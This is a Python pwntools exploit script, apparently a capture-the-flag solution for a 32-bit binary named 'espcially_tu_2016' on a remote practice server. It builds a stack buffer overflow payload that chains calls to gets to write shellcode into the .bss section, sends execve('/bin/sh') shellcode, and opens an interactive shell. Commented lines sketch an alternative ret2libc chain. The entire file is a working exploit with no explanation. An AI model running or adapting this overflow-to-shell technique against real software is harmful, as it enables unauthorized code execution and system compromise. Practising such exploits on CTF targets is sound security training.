import sys
from pwn import *
context.log_level='debug'
context.arch='i386'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process('./espcially_tu_2016')
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF('./espcially_tu_2016')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')
		else :
			io=remote('node3.buuoj.cn',29390)
			elf=ELF('./espcially_tu_2016')
			libc=ELF('/lib/i386-linux-gnu/libc.so.6')

		
		# gdb.attach(io)
		# pause()
		pay='a'*0x2c+p32(elf.sym['gets'])+p32(elf.sym['gets'])+p32(elf.bss()+0x100)+p32(elf.bss()+0x100)
		io.recv()
		io.sendline(pay)
		io.recv()
		io.sendline('1')
		# io.recvuntil('er!\n')
		# libc_base=u32(io.recv(4))-libc.sym['gets']
		# libc.address=libc_base
		#success('libc:'+hex(libc_base))
		#pay='a'*0x2c+p32(libc.sym['system'])+p32(0x08048420)+p32(libc.search('/bin/sh\x00').next())
		io.recv()
		io.sendline(asm(shellcraft.sh()))
		#io.recv()
		#io.sendline('1')

		# io.sendline(asm(shellcraft.sh()))

		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue